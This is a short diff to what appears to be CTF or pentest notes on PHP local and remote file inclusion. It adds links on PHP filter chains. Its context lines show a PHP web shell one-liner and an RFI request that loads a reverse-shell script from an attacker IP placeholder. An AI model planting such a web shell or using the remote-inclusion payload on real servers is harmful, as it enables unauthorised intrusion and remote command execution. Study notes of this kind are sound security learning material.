@@ -55,6 +55,12 @@ Content-Length: 41
 <?php echo shell_exec($_GET['cmd']); ?>
 ```
 
+:star: PHP filter chain
+
+https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT
+
+https://ctftime.org/writeup/36071
+
 RFI
 
 - method1 
@@ -76,3 +82,4 @@ RFI
     # vulnerability page
     /test.php?url=http://<attcker ip>:<attacker port>/php-reverse-shell.php
     ```
+
